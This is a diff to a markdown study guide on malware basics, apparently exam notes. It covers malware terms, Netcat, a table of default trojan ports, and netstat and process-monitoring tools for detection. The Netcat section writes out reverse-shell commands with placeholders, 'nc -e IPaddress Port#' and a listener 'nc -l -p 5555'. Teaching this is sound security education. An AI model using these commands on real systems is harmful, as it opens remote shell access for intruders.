@@ -3,7 +3,7 @@
 ### <u>Malware Basics</u>
 
 - **Malware** - software designed to harm or secretly access a computer system without informed consent
-- Most is downloaded from the Internet with or without the user's knowledge
+  - Most is downloaded from the Internet with or without the user's knowledge
 - **Overt Channels** - legitimate communication channels used by programs
 - **Covert Channels** - used to transport data in unintended ways
 - **Wrappers** - programs that allow you to bind an executable to an innocent file
@@ -40,32 +40,32 @@
 - **Netcat**
   - "Swiss army knife" of tcp/ip hacking
   - Provides all sorts of control over a remote shell on a target
-  - Connects via **nc -e IPaddress Port#**
-  - From attack machine **nc -l -p 5555** opens a listening port on 5555
+  - Connects via `nc -e IPaddress Port#` to establich command-line access
+  - From attack machine `nc -l -p 5555` opens a listening port on 5555
   - Can connect over TCP or UDP, from any port
   - Offers DNS forwarding, port mapping and forwarding and proxying
 - **Trojan Port Numbers**
 
-| Trojan Name        | Port   |
-|--------------------|--------|
-| Death              | 2      |
-| Senna Spy          | 20     |
-| Hackers Paradise   | 31,456 |
-| TCP Wrappers       | 421    |
-| Doom, Santaz Back  | 666    |
-| Silencer, WebEx    | 1001   |
-| RAT                | 1095-98|
-| SubSeven           | 1243   |
-| Shiva-Burka        | 1600   |
-| Trojan Cow         | 2001   |
-| Deep Throat        | 6670-71|
-| Tini               | 7777   |
-| NetBus             | 12345-6|
-| Whack a Mole       | 12361-3|
-| Back Orifice       | 31337,8|
+| Trojan Name        | Port       |
+|--------------------|------------|
+| Death              | 2          |
+| Senna Spy          | 20         |
+| Hackers Paradise   | 31,456     |
+| TCP Wrappers       | 421        |
+| Doom, Santaz Back  | 666        |
+| Silencer, WebEx    | 1001       |
+| RAT                | 1095-98    |
+| SubSeven           | 1243       |
+| Shiva-Burka        | 1600       |
+| Trojan Cow         | 2001       |
+| Deep Throat        | 6670-71    |
+| Tini               | 7777       |
+| NetBus             | 12345-6    |
+| Whack a Mole       | 12361-3    |
+| Back Orifice       | 31337,31338|
 
-- **netstat -an** - shows open ports in numerical order
-- **netstat -b** - displays all active connections and the processes using them
+- `netstat -an` - shows open ports in numerical order
+- `netstat -b` - displays all active connections and the processes using them
 - **Process Explorer** - Microsoft tool that shows you everything about running processes
 - **Registry Monitoring Tools**
   - SysAnalyzer
